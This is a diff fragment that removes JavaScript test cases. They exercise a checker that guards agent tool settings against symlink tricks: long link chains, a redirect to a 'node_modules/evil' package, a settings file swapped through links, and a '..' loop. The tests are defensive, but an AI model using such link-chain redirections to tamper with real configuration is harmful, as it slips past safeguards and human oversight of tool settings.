-    fails(run(swap(dir => { intoCfg(() => "l1")(dir); for (let i = 1; i <= 45; i++) fs.symlinkSync(i < 45 ? `l${i + 1}` : "cfg", path.join(dir, `l${i}`)); },
-      dir => { fs.unlinkSync(path.join(dir, "l45")); fs.symlinkSync("node_modules/evil", path.join(dir, "l45")); })), "and so is one past forty links, as Windows follows them", UNHELD);
-    const roundKept = run(swap(dir => { fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.symlinkSync(`../${self(dir)}/node_modules/pkg/.claude`, path.join(dir, ".claude")); }, dir => fs.writeFileSync(path.join(dir, "README.md"), "x\n")));
-    ok(roundKept.status === 0 && roundKept.out.includes("reported, never failed"), "while one the base held that leaves and comes back in, as it stood, is still reported, never failed", roundKept.out);
-    // (and one whose way comes back in after as many links as Windows follows, a way back in no link of them)
-    fails(run(swap(dir => { fs.mkdirSync(path.join(dir, "cfg"), { recursive: true }); fs.writeFileSync(path.join(dir, "cfg/settings.json"), KIT); fs.rmSync(path.join(dir, ".claude/settings.json"), { force: true }); fs.symlinkSync("../l1", path.join(dir, ".claude/settings.json")); for (let i = 1; i <= 62; i++) fs.symlinkSync(i < 62 ? `l${i + 1}` : `../${self(dir)}/cfg/settings.json`, path.join(dir, `l${i}`)); },
-      dir => fs.writeFileSync(path.join(dir, "cfg/settings.json"), JSON.stringify({ ...JSON.parse(KIT), model: "opus" })))), "and so is one whose way comes back in after as many links as Windows follows, what it leads to changed", UNHELD);
-    // (and a way that leaves and comes back in by ".." again and again, by a link beside the checkout, ends)
-    const loopsAt = path.join(os.tmpdir(), `agent-tools-loop-${process.pid}`);
-    try {
-      fs.rmSync(loopsAt, { force: true });
-      const looped = swap(dir => { fs.symlinkSync(`${fs.realpathSync(dir)}${path.sep}..${path.sep}${path.basename(loopsAt)}`, loopsAt); fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.symlinkSync(`../${path.basename(loopsAt)}`, path.join(dir, ".claude")); }, dir => fs.writeFileSync(path.join(dir, "README.md"), "x\n"));
-      const ended = spawnSync(process.execPath, [SCRIPT, "checks/licences.json"], { cwd: looped, encoding: "utf8", timeout: 60_000 });
-      ok(ended.status === 0 && `${ended.stdout}`.includes("reported, never failed"), "and a way that leaves and comes back in again and again ends, as the base held it", `${ended.stdout}${ended.stderr}${ended.error ?? ""}`);
-    } finally { fs.rmSync(loopsAt, { force: true }); }
-
-  }
 }
 
 // ---- what the tools' settings set in the environment of the programs they start ----
